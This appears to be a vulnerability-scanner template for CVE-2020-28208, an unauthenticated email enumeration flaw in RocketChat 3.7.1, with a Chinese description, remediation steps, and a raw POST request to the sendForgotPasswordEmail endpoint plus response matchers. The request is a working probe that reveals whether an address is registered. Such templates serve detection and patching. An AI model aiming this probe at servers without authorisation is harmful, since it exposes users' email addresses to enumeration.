id: CVE-2020-28208
info:
  name: RocketChat Unauthenticated Email enumeration
  author:
  - pdteam
  description: |-
    RocketChat未授权邮件地址枚举漏洞
    RocketChat是一套开源的团队聊天软件。

    RocketChat 3.7.1 存在安全漏洞，攻击者可利用该漏洞进行电子邮件地址枚举。
  severity: medium
  remediation: |-
    官方修复方案：：
    1、建议用户到官方获取最新补丁或者最新版本程序：
    https://rocket.chat/

    临时修复方案：
    1、前后端同时对用户输入信息进行校验，双重验证机制。
    2、调用功能前验证用户是否有权限调用相关功能。
    3、去除页面中涉及的敏感信息或删除泄露信息页面
    4、统一sendForgotPasswordEmail接口返回结果，防止邮件地址枚举
requests:
- matchers:
  - type: status
    status:
    - 200
  - type: word
    condition: and
    part: body
    words:
    - '"result\":false'
    - '"success":true'
  matchers-condition: and
  raw:
  - |
    POST /api/v1/method.callAnon/sendForgotPasswordEmail HTTP/1.1
    Host: {{Hostname}}
    Origin: {{BaseURL}}
    Content-Type: application/json

    {"message":"{\"msg\":\"method\",\"method\":\"sendForgotPasswordEmail\",\"params\":[\"user@local.email\"],\"id\":\"3\"}"}
